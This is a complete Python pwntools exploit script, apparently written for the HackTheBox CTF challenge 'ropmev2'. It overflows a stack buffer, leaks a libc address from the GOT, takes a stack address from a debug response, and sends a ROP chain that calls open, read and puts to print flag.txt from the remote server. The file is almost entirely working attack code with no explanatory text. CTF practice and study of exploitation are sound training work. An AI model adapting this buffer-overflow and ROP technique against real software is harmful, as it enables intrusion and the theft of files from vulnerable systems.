#!/usr/bin/python
from pwn import remote, process, context, socks
from struct import pack, unpack
from binascii import unhexlify, hexlify



context(arch = 'amd64', os = 'linux' , proxy=(socks.SOCKS5, 'localhost', 8888))

def printf_conv(inStr):
	f = ''
	for i in inStr:
		cc = hex(i)[2:]
		if len(cc) == 1:
			f = '0' + cc + f
		else:
			f = cc + f
	return int(f, 16)

def expl():
	#r = process(argv='./ropmev2', level='error')
	r = remote('docker.hackthebox.eu', 31175)


	### find libc base addr
	r.recvline()
	rbp1 = pack('Q', 0x0)
	rg1 = pack('Q', 0x40142b) # pop rdi ; ret
	libc_got = pack('Q', 0x4033F0) # got (read)
	ret_add = pack('Q', 0x4011E4)
	output = 208*b'a' + rbp1 + rg1 + libc_got + ret_add
	r.sendline(output)
	read_add = printf_conv(r.recvn(6))

	print('read addr  -> ' + hex(read_add))

	'''
	base_add = read_add - 0x0f04b0
	open_add = base_add + 0x0f01d0
	puts_add = base_add + 0x077160
	'''
	base_add = read_add - 0x110070
	open_add = base_add + 0x10fc40
	puts_add = base_add + 0x0809c0

	# get stack addr
	r.recvline()
	output = b'DEBUG'
	r.sendline(output)
	stack_add = int(r.recvline().decode('ascii')[-13:-1], 16) - 10*0xD0

	print('stack addr -> ' + hex(stack_add))


	### write txt to heap for opening file
	# rdi 0
	# rsi stack_add
	# rdx 9
	r.recvline()
	rbp = pack('Q', 0x0)
	rg1 = pack('Q', 0x040142b) # pop rdi ; ret
	rdi = pack('Q', 0x0)
	rg2 = pack('Q', 0x0401429) # pop rsi ; pop r15 ; ret
	rsi = pack('Q', stack_add) + pack('Q', 0x0)
	rg3 = pack('Q', 0x0401164) # pop rdx ; pop r13 ; ret
	rdx = pack('Q', 0x9) + pack('Q', 0x0)
	read_add_p = pack('Q', read_add)
	exp = 208*b'b' + rbp + rg1 + rdi + rg2 + rsi + rg3 + rdx + read_add_p


	### opening file
	# rdi stack_add
	# rsi 0
	rg1 = pack('Q', 0x040142b) # pop rdi ; ret
	rdi = pack('Q', stack_add)
	rg2 = pack('Q', 0x0401429) # pop rsi ; pop r15 ; ret
	rsi = pack('Q', 0x0) + pack('Q', 0x0)
	open_add_p = pack('Q', open_add)
	exp += rg1 + rdi + rg2 + rsi + open_add_p


	### read flag from fd 3
	# rdi 3
	# rsi stack_add - 0x50
	# rdx 0x40
	rg1 = pack('Q', 0x040142b) # pop rdi ; ret
	rdi = pack('Q', 0x3)
	rg2 = pack('Q', 0x0401429) # pop rsi ; pop r15 ; ret
	rsi = pack('Q', stack_add - 0x50) + pack('Q', 0x0)
	rg3 = pack('Q', 0x0401164) # pop rdx ; pop r13 ; ret
	rdx = pack('Q', 0x40) + pack('Q', 0x0)
	exp += rg1 + rdi + rg2 + rsi + rg3 + rdx + read_add_p


	### puts read data
	# rdi stack_add - 0x50
	rg1 = pack('Q', 0x040142b) # pop rdi ; ret
	rdi1 = pack('Q', stack_add - 0x50)
	puts_add_p = pack('Q', puts_add)
	exp += rg1 + rdi1 + puts_add_p
	r.sendline(exp)
	input()
	r.sendline(b'flag.txt\0')
	r.interactive()
	#print(r.recvline().decode('ascii')[:-1])

expl()